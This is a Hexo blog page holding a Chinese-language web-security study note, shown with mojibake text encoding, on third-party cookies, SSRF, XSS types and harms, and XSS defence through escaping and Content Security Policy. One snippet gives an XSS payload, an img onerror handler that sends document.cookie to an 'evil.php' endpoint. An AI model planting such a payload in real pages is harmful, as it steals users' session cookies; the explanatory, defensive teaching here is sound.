<p>ç¬¬ä¸‰æ–¹ç½‘ç«™å¼•å¯¼å‘å‡ºçš„ Cookieï¼Œå°±ç§°ä¸ºç¬¬ä¸‰æ–¹ Cookieã€‚å®ƒé™¤äº†ç”¨äº CSRF æ”»å‡»ï¼Œè¿˜å¯ä»¥ç”¨äºç”¨æˆ·è¿½è¸ªã€‚<br>Cookie çš„SameSiteå±æ€§ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ Cookieï¼Œä»è€Œå‡å°‘å®‰å…¨é£é™©ã€‚ä½†å¯èƒ½é€ æˆéå¸¸ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚æ¯”å¦‚ï¼Œå½“å‰ç½‘é¡µæœ‰ä¸€ä¸ª GitHub é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»è·³è½¬å°±ä¸ä¼šå¸¦æœ‰ GitHub çš„ Cookieï¼Œè·³è½¬è¿‡å»æ€»æ˜¯æœªç™»é™†çŠ¶æ€ã€‚</p>
<!-- ![](/images/web_security/same_site.png) -->

<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRFï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ŒæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ç”±æ”»å‡»è€…æ„é€ çš„æ¼æ´ï¼Œç”¨äºå½¢æˆæœåŠ¡å™¨å‘èµ·çš„è¯·æ±‚ã€‚é€šå¸¸ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–éƒ¨ç½‘ç»œæ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚ssrfæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œç”¨æˆ·æ³¨å…¥æ¶æ„çš„ä»£ç ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ç”¨æˆ·æ³¨å…¥çš„è„šæœ¬åµŒå…¥åˆ°äº†é¡µé¢ä¸­ã€‚ç”±äºæµè§ˆå™¨æ— æ³•è¯†åˆ«è¿™äº›æ¶æ„ä»£ç æ­£å¸¸è§£ææ‰§è¡Œï¼Œæ”»å‡»è€…çš„æ¶æ„æ“ä½œè¢«æˆåŠŸæ‰§è¡Œï¼Œæ¯”å¦‚å¯ä»¥è·å–ç”¨æˆ·çš„cookieæ•°æ®ç„¶åå‘é€ç»™è‡ªå·±æˆ–è€…å†’å……æ­£å¸¸ç”¨æˆ·å‘è¢«æ”»å‡»çš„æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚</p>
<p>xssæ”»å‡»åˆ†ç±»</p>
<ul>
<li>åå°„å‹ï¼šæ”»å‡»è€…æ„é€ ä¸€ä¸ªå¸¦æœ‰æ¶æ„ä»£ç çš„urlé“¾æ¥è¯±å¯¼æ­£å¸¸ç”¨æˆ·ç‚¹å‡»ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°è¿™ä¸ªurlå¯¹åº”çš„è¯·æ±‚è¯»å–å‡ºå…¶ä¸­çš„å‚æ•°ç„¶åæ²¡æœ‰åšè¿‡æ»¤å°±æ‹¼æ¥åˆ°Htmlé¡µé¢å‘é€ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£ææ‰§è¡Œ</li>
<li>å­˜å‚¨å‹ï¼š æ”»å‡»è€…å°†å¸¦æœ‰æ¶æ„ä»£ç çš„å†…å®¹å‘é€ç»™æœåŠ¡å™¨ï¼ˆæ¯”å¦‚åœ¨è®ºå›ä¸Šå‘å¸–ï¼‰ï¼ŒæœåŠ¡å™¨æ²¡æœ‰åšè¿‡æ»¤å°±å°†å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œä¸‹æ¬¡å†è¯·æ±‚è¿™ä¸ªé¡µé¢çš„æ—¶å€™æœåŠ¡å™¨ä»æ•°æ®åº“ä¸­è¯»å–å‡ºç›¸å…³çš„å†…å®¹æ‹¼æ¥åˆ°htmlä¸Šï¼Œæµè§ˆå™¨æ”¶åˆ°ä¹‹åè§£ææ‰§è¡Œ</li>
<li>domå‹ï¼šdomå‹xssä¸»è¦å’Œå‰ç«¯jsæœ‰å…³ï¼Œæ˜¯å‰ç«¯jsè·å–åˆ°ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ç„¶åæ‹¼æ¥åˆ°htmlä¸­</li>
</ul>
<p>xsså±å®³</p>
<ol>
<li>cookieåŠ«æŒï¼ˆçªƒå–cookieï¼‰</li>
<li>é’“é±¼ï¼Œåˆ©ç”¨xssæ„é€ å‡ºä¸€ä¸ªç™»å½•æ¡†ï¼Œéª—å–ç”¨æˆ·è´¦æˆ·å¯†ç ã€‚</li>
</ol>
<p>åˆ©ç”¨é”™è¯¯ä¿¡æ¯å’Œæœç´¢ç»“æœçš„åå°„è¿›è¡Œçš„ XSSï¼Œç§°ä¸ºåå°„å‹ XSS<br>ç›—å–ç”¨æˆ· cookieï¼Œä¾‹å¦‚æ’å…¥è¿™æ ·ä¸€æ®µä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">  src=&quot;xx&quot;</span><br><span class="line">  onerror=&quot;post(&#x27;../evil.php?cakemonster=&#x27; + escape(document.cookie))&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å¦ä¸€ç§ XSS æ˜¯å‚¨å­˜å‹ XSSã€‚å‚¨å­˜å‹ä¹Ÿæ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œæ”»å‡»è€…æŠŠæ¶æ„è„šæœ¬æäº¤åˆ°è¢«å®³æœåŠ¡å™¨ï¼Œå¹¶æˆåŠŸå‚¨å­˜ï¼Œæ‰€æœ‰äººè®¿é—®ç‰¹å®šé¡µé¢éƒ½ä¼šé­åˆ°æ”»å‡»ã€‚</p>
<p>æ€»ä¹‹ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰å°†ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬è¿›è¡Œåˆé€‚çš„è¿‡æ»¤ï¼Œå°±è´¸ç„¶æ’å…¥åˆ° HTML ä¸­ï¼Œè¿™å¾ˆå®¹æ˜“é€ æˆæ³¨å…¥æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´ï¼Œæ„é€ å‡ºæ¶æ„çš„ä»£ç æŒ‡ä»¤ï¼Œè¿›è€Œåˆ©ç”¨æ¶æ„ä»£ç å±å®³æ•°æ®å®‰å…¨ã€‚</p>
<p>XSSé˜²å¾¡ï¼š</p>
<p>å¯¹äºXSSæ”»å‡»æ¥è¯´ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹å¼æ¥è¿›è¡Œé˜²å¾¡ã€‚</p>
<p>1ã€è½¬ä¹‰å­—ç¬¦ï¼›<br>2ã€CSPå®‰å…¨å†…å®¹ç­–ç•¥ï¼šCSP æœ¬è´¨ä¸Šå°±æ˜¯å»ºç«‹ç™½åå•ï¼Œå¼€å‘è€…æ˜ç¡®å‘Šè¯‰æµè§ˆå™¨å“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚æˆ‘ä»¬åªéœ€è¦é…ç½®è§„åˆ™ï¼Œå¦‚ä½•æ‹¦æˆªæ˜¯ç”±æµè§ˆå™¨è‡ªå·±å®ç°çš„ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥å°½é‡å‡å°‘ XSS æ”»å‡»ã€‚</p>
<h1 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h1><p>CSP è¯ç”Ÿçš„ä¸»è¦ç›®çš„å°±æ˜¯é˜²å¾¡ XSS æ”»å‡». ä¸¥æ ¼çš„ CSP åœ¨ XSS çš„é˜²èŒƒä¸­å¯ä»¥èµ·åˆ°ä»¥ä¸‹çš„ä½œç”¨ï¼š</p>
<ul>
<li>ç¦æ­¢åŠ è½½å¤–åŸŸä»£ç ï¼Œé˜²æ­¢å¤æ‚çš„æ”»å‡»é€»è¾‘ã€‚</li>
<li>ç¦æ­¢å¤–åŸŸæäº¤ï¼Œç½‘ç«™è¢«æ”»å‡»åï¼Œç”¨æˆ·çš„æ•°æ®ä¸ä¼šæ³„éœ²åˆ°å¤–åŸŸã€‚</li>
<li>ç¦æ­¢å†…è”è„šæœ¬æ‰§è¡Œï¼ˆè§„åˆ™è¾ƒä¸¥æ ¼ï¼Œç›®å‰å‘ç° GitHub ä½¿ç”¨ï¼‰ã€‚</li>
<li>ç¦æ­¢æœªæˆæƒçš„è„šæœ¬æ‰§è¡Œï¼ˆæ–°ç‰¹æ€§ï¼ŒGoogle Map ç§»åŠ¨ç‰ˆåœ¨ä½¿ç”¨ï¼‰ã€‚</li>
<li>åˆç†ä½¿ç”¨ä¸ŠæŠ¥å¯ä»¥åŠæ—¶å‘ç° XSSï¼Œåˆ©äºå°½å¿«ä¿®å¤é—®é¢˜ã€‚</li>
</ul>
<p>CSP çš„ä½œç”¨</p>
<ol>
<li>ä¸å…è®¸å†…è”scriptæ‰§è¡Œ</li>
<li>ä¸å…è®¸åŠ è½½éä¿¡ä»»çš„è„šæœ¬èµ„æº</li>
<li>ä¸å…è®¸å‘éä¿¡ä»»çš„urlå‘é€ä¿¡æ¯</li>
</ol>
<p>é€šå¸¸å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥å¼€å¯ CSPï¼š</p>
<ul>
<li>è®¾ç½® HTTP Header ä¸­çš„ Content-Security-Policy</li>
<li>è®¾ç½® meta æ ‡ç­¾çš„æ–¹å¼</li>
</ul>
<p>CSP doesnâ€™t (and canâ€™t) prevent CSRF. Even if you forbid all scripts from executing, CSRF attacks are still possible if no per-request tokens are used</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/06/15/web-security/" data-id="ckqhp9u6z001b3ot06u8vfa5p" data-title="web security" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ACM/" rel="tag">ACM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/" rel="tag">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ACM/" style="font-size: 15px;">ACM</a> <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JVM/" style="font-size: 17.5px;">JVM</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/06/13/python/">Python</a>
          </li>
        
          <li>
            <a href="/2021/02/09/virtualbox-ubuntu/">virtualbox ubuntuå®‰è£…é…ç½®</a>
          </li>
        
          <li>
            <a href="/2021/02/08/v2ray/">æ­æ¢¯å­</a>
          </li>
        
          <li>
            <a href="/2021/02/08/SuffixArray/">SuffixArray</a>
          </li>
        
          <li>
            <a href="/2021/01/29/IO-Multiplexing/">I/O å¤šè·¯å¤ç”¨</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>